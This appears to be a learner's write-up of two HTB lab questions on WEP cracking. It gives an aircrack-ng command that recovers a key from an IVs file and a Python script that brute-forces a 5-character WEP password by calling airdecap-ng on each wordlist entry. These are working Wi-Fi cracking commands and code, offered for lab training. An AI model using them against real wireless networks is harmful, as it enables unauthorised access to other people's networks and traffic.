# [Additional WEP Cracking](Additional%20WEP%20Cracking.md)
### Use aircrack-ng to crack the WEP key from the file located at "/opt/WEP.ivs" and submit the found key as answer. (Format: XX:XX)

```sh
aircrack-ng -K /opt/WEP.ivs
```

![](Screenshot%202026-09-22%20at%2013.31.29.png)
### Perform the advanced WEP cracking as described in this section to decrypt the file located at "/opt/WEP-01.cap" and submit the 5-character password.

Using this script that HTB provided

```python
import sys
import binascii
import re
from subprocess import Popen, PIPE
import time

# Start timer
start_time = time.time()

# File paths
cap_file = '/opt/WEP-01.cap'
wordlist_path = '/opt/1000000-password-seclists.txt'
wordlist = []

# Read wordlist file to a list
with open(wordlist_path, 'r') as f:
    wordlist = f.readlines()

# Iterate over the wordlist
for ln, word in enumerate(wordlist, start=1):
    # Clean the line to remove non-alphanumeric characters
    key = re.sub(r'\W+', '', word)

    # Filter wordlist to only keep 5-character long words
    if len(key) != 5 :
        continue

    # Encode the WEP key to bytes and convert to hexadecimal
    hex_key = binascii.hexlify(key.encode('utf-8'))

    # Print the current attempt
    print(f"{ln}: Trying Key: {key} Hex: {hex_key}")

    # Run airdecap-ng with the current WEP key
    p = Popen(['/usr/bin/airdecap-ng', '-w', hex_key, cap_file], stdout=PIPE)
    output = p.stdout.read().decode("utf-8")

    # Check if the key was successful
    if int(output.split('\n')[5][-1]) > 0:
        print(f"Success! WEP key found: {key}")
        end_time = time.time()
        print(f"Total time: {end_time - start_time:.6f} seconds")
        sys.exit(0)

# If no key was found
print("No WEP key found")
```

Then run it

```sh
python3 brute.py
```

![](Screenshot%202026-09-22%20at%2013.33.08.png)